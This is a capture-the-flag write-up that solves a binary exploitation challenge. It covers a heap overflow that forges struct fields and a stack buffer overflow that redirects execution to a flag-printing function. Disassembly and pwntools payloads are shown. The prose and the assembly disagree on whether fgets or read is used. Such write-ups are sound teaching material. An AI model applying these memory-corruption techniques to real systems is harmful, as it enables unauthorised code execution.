---
title: "Veni Vidi Vici CTF 2026 - Labyrinth"
pubDatetime: 2026-03-09T15:42:00+05:30
author: "astroanax"
---

The challenge text about an ancient maze and a dragon, with a netcat address. Also got a stripped 64-bit ELF binary, dynamically linked. Checksec showed no PIE, no stack canary, partial RELRO, NX enabled. No PIE means addresses are fixed, which is useful.

```
Arch:    amd64
RELRO:   Partial RELRO
Stack:   No canary found
NX:      NX enabled
PIE:     No PIE
```

Running the binary gives a short menu - edit bio, fight dragon, exit. Opening it in radare2 and looking at the function list revealed a few interesting things right away. There is a function at `0x4011b6` that opens `flag.txt` and prints its contents. That is the win function and the whole goal is to redirect execution there.

```
; fcn.004011b6
lea rax, str._n______THE_ANCIENT_PROPHECY_FULFILLED______
call sym.imp.puts
lea rax, str.flag.txt          ; "flag.txt"
call sym.imp.fopen
; ...
lea rdx, str.___FLAG:__s_n     ; "[+] FLAG: %s\n"
call sym.imp.printf
call sym.imp.fclose
```

The first thing I looked at was the edit bio path. The binary allocates a single heap chunk of 0x50 bytes during initialization and stores a struct in it. The struct layout from reading the init code was roughly: 64 bytes of bio text, then a 4-byte sanity token set to [0xDEADBEEF](https://en.wikipedia.org/wiki/Hexspeak) at offset 0x40, then 8 bytes of counters at offsets 0x44 and 0x48, then a 4-byte chosen_one flag at offset 0x4C initialized to zero.

```c
struct Hero {
    char bio[64];        
    uint32_t sanity;     
    uint32_t counter1;   
    uint32_t counter2;   
    uint32_t chosen_one; 
};
```

The edit bio function reads into the bio buffer with `fgets` but passes `0x80` as the size limit while the buffer is only `0x40` bytes. That is a 64-byte overflow directly into the struct fields that follow. The catch is that later code checks whether the sanity token still equals `0xDEADBEEF` and kills the process if it does not.

```asm
; edit bio - reads 0x80 into a 0x40 heap buffer
mov edx, 0x80          ; size = 128
mov rsi, rax           ; buf = hero->bio  (only 64 bytes!)
mov edi, 0
call sym.imp.read

; sanity check right after
mov eax, dword [rax + 0x40]
cmp eax, 0xdeadbeef
je  0x4013d6           ; ok
; else: "You corrupted the sanity token!" -> exit
```

So the overflow has to be careful: fill 64 bytes of bio, write `0xDEADBEEF` back at offset 0x40, then pad the 8 counter bytes, and set `chosen_one` at offset 0x4C to 1. The fight dragon menu option checks `chosen_one` and refuses to proceed if it is zero.

```python
payload1  = b"A" * 64          
payload1 += p32(0xDEADBEEF)    
payload1 += b"B" * 8           
payload1 += p32(1)             
```

The fight dragon path, when `chosen_one` is set, calls a chant function at `0x401248`. That function allocates `0x20` bytes on the stack with `sub rsp, 0x20` and then reads `0x80` bytes into that buffer using the `read` syscall wrapper. So the buffer is 32 bytes but `read` will accept up to 128. Classic stack buffer overflow. Padding is 32 bytes to fill the buffer, then 8 bytes to overwrite the saved RBP, and then the return address.

```asm
; fcn.00401248 - chant function
sub rsp, 0x20              

lea rax, [buf]             
mov edx, 0x80              
mov rsi, rax
mov edi, 0
call sym.imp.read          

leave
ret                        
```

The stack frame looks like this:

```
rbp-0x20  [ buf - 32 bytes    ]  <-- read() writes here
rbp+0x00  [ saved rbp - 8 b   ]  <-- overwritten with junk
rbp+0x08  [ return address    ]  <-- overwritten with win addr
```

Because the win function at `0x4011b6` makes a call into `printf` which uses SSE instructions internally, the stack has to be 16-byte aligned when entering it. Jumping directly to `0x4011b6` sometimes crashes on a `movaps` instruction. The fix is to put a bare `ret` gadget before the win address to consume one more push worth of alignment. There is a clean `ret` at `0x40101a` inside the `_start` helper area. Adding that as an extra step before the win address resolves the alignment issue.

The full payload for stage two is 32 bytes of padding, 8 bytes to clobber saved RBP, then `p64(0x40101a)` for alignment, then `p64(0x4011b6)` for the win function. One important detail: the chant function uses `read()` not `fgets`, so no newline is needed to terminate the input. Using `send()` rather than `sendline()` avoids injecting an extra byte that could shift the offsets.

```python
ret_gadget = 0x40101a   # bare ret for SSE stack alignment
win        = 0x4011b6

payload2  = b"A" * 32   # fill buffer [rbp-0x20]
payload2 += b"B" * 8    # overwrite saved rbp
payload2 += p64(ret_gadget)
payload2 += p64(win)
```

Putting it together in pwntools and sendng option 1, wait for the New Bio prompt, send the 80-byte heap overflow, wait for the menu again, send option 2, wait for Chant, send the 48-byte ROP chain. Then collect output and look for the flag.

Against the remote the server returned the real flag:

```
parsec{R3wr1t1ng_Th3_Prophecy}
```

code [here](./solve.py)
